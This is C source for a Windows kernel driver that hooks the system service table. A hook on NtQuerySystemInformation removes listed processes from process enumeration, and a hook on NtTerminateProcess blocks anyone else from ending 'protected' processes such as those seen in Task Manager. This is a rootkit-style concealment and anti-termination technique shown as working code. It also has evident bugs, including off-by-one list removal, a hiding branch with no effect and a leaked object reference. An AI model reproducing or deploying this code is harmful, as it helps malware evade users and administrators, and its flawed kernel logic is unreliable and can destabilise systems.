#include "HookLogic.h"


ULONG global_ProtectedProcessIds[MAX_SSDT_HOOK_PROCESS_ID_NUMBER] = {0};
ULONG global_ProtectedProcessIdsLength = 0;

ULONG global_HidedProcessIds[MAX_SSDT_HOOK_PROCESS_ID_NUMBER] = {0};
ULONG global_HidedProcessIdsLength = 0;

NTQUERYSYSTEMINFORMATION pOldNtQuerySystemInformation = NULL;
NTTERMINATEPROCESS pOldNtTerminateProcess = NULL;

ULONG CheckProcessIsInProtectList(ULONG aProcessId)
{
	if (aProcessId == 0)
		return -1;

	for (ULONG i = 0; (i < global_ProtectedProcessIdsLength && i < MAX_SSDT_HOOK_PROCESS_ID_NUMBER); ++i)
	{
		if (global_ProtectedProcessIds[i] == aProcessId)
			return i;
	}

	return -1;
}

ULONG CheckProcessIsInHideList(ULONG aProcessId)
{
	if (aProcessId == 0)
		return -1;

	for (ULONG i = 0; (i < global_HidedProcessIdsLength && i < MAX_SSDT_HOOK_PROCESS_ID_NUMBER); ++i)
	{
		if (global_HidedProcessIds[i] == aProcessId)
			return i;
	}

	return -1;
}

BOOLEAN InsertProcessInProtectList(ULONG aProcessId)
{
	if (CheckProcessIsInProtectList(aProcessId) == -1 && global_ProtectedProcessIdsLength < MAX_SSDT_HOOK_PROCESS_ID_NUMBER)
	{
		global_ProtectedProcessIds[global_ProtectedProcessIdsLength++] = aProcessId;

		return TRUE;
	}

	return FALSE;
}

BOOLEAN RemoveProcessFromProtectList(ULONG aProcessId)
{
	ULONG index = CheckProcessIsInProtectList(aProcessId);

	if (index != -1)
	{
		global_ProtectedProcessIds[index] = global_ProtectedProcessIds[global_ProtectedProcessIdsLength--];

		return TRUE;
	}

	return FALSE;
}

BOOLEAN InsertProcessInHideList(ULONG aProcessId)
{
	if (CheckProcessIsInHideList(aProcessId) == -1 && global_HidedProcessIdsLength < MAX_SSDT_HOOK_PROCESS_ID_NUMBER)
	{
		global_HidedProcessIds[global_HidedProcessIdsLength++] = aProcessId;

		return TRUE;
	}

	return FALSE;
}

BOOLEAN RemoveProcessFromHideList(ULONG aProcessId)
{
	ULONG index = CheckProcessIsInHideList(aProcessId);

	if (index != -1)
	{
		global_HidedProcessIds[index] = global_HidedProcessIds[global_HidedProcessIdsLength--];

		return TRUE;
	}

	return FALSE;
}

NTSTATUS HookNtQuerySystemInformation(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__out_bcount_opt(SystemInformationLength) PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	)
{
	NTSTATUS status = STATUS_SUCCESS;

	pOldNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)oldSysServiceAddr[SYSCALL_INDEX(ZwQuerySystemInformation)];

	status = pOldNtQuerySystemInformation(SystemInformationClass, 
		SystemInformation, SystemInformationLength, ReturnLength);

	if (!NT_SUCCESS(status))
	{
		return status;
	}

	if (SystemProcessInformation != SystemInformationClass)
	{
		return status;
	}

	PSYSTEM_PROCESS_INFORMATION pPrevProcessInfo = NULL;
	PSYSTEM_PROCESS_INFORMATION pCurrProcessInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

	while (pCurrProcessInfo != NULL)
	{
		// 获取当前遍历的 SYSTEM_PROCESS_INFORMATION 节点的进程名称和进程 ID
		ULONG processId = (ULONG)pCurrProcessInfo->UniqueProcessId;
		UNICODE_STRING tmpProcessName = pCurrProcessInfo->ImageName;

		// 判断当前进程是否为需要隐藏的进程
		if (CheckProcessIsInHideList(processId) != -1)
		{
			if (pPrevProcessInfo)
			{
				if (pCurrProcessInfo->NextEntryOffset)
				{
					// 将当前进程从SystemInformation中移除
					pPrevProcessInfo->NextEntryOffset += pCurrProcessInfo->NextEntryOffset;
				}
				else
				{
					// 当前隐藏的这个进程是进程链表的最后一个
					pPrevProcessInfo->NextEntryOffset = 0;
				}
			}
			else
			{
				// 第一个遍历到的进程就是要隐藏的进程
				if (pCurrProcessInfo->NextEntryOffset)
				{
					BYTE *tempSystemInformation = (BYTE *)SystemInformation + pCurrProcessInfo->NextEntryOffset;
					SystemInformation = tempSystemInformation;
				}
				else
				{
					SystemInformation = NULL;
				}
			}
		}

		// 遍历下一个SYSTEM_PROCESS_INFORMATION节点
		pPrevProcessInfo = pCurrProcessInfo;

		// 遍历结束
		if (pCurrProcessInfo->NextEntryOffset)
		{
			pCurrProcessInfo = (PSYSTEM_PROCESS_INFORMATION)(((PCHAR)pCurrProcessInfo) + pCurrProcessInfo->NextEntryOffset);
		}
		else
		{
			pCurrProcessInfo = NULL;
		}
	}

	return status;
}

NTSTATUS HookNtTerminateProcess( __in_opt HANDLE ProcessHandle, __in NTSTATUS ExitStatus )
{
	PEPROCESS pEProcess = NULL;

	// 通过进程句柄来获得该进程所对应的FileObject对象，由于这里是进程对象，获得的就是EPROCESS对象
	NTSTATUS status = ObReferenceObjectByHandle(ProcessHandle, FILE_READ_DATA, NULL, KernelMode, (PVOID *)&pEProcess, NULL);
	if (!NT_SUCCESS(status))
	{
		return status;
	}

	// 保存SSDT中原来的NtTerminateProcess地址
	pOldNtTerminateProcess = (NTTERMINATEPROCESS)oldSysServiceAddr[SYSCALL_INDEX(ZwTerminateProcess)];

	// 通过该函数可以得到进程名和进程Id
	// 该函数是未文档化的导出函数（可参考WRK），需要自己声明
	ULONG processId = (ULONG)PsGetProcessId(pEProcess);
	PCHAR processName = (PCHAR)PsGetProcessImageFileName(pEProcess);

	// 通过进程名来初始化ANSI字符串
	ANSI_STRING ansiProcessName;
	RtlInitAnsiString(&ansiProcessName, processName);

	if (CheckProcessIsInProtectList(processId) != -1)
	{
		// 确保调用者进程能够结束（这里主要指taskmgr.exe）
		if (processId != (ULONG)PsGetProcessId(PsGetCurrentProcess()))
		{
			// 如果是被保护的进程，返回无权限访问
			return STATUS_ACCESS_DENIED;
		}
	}

	// 非保护进程，则调用真正的NtTerminalProcess结束进程
	status = pOldNtTerminateProcess(ProcessHandle, ExitStatus);

	return status;
}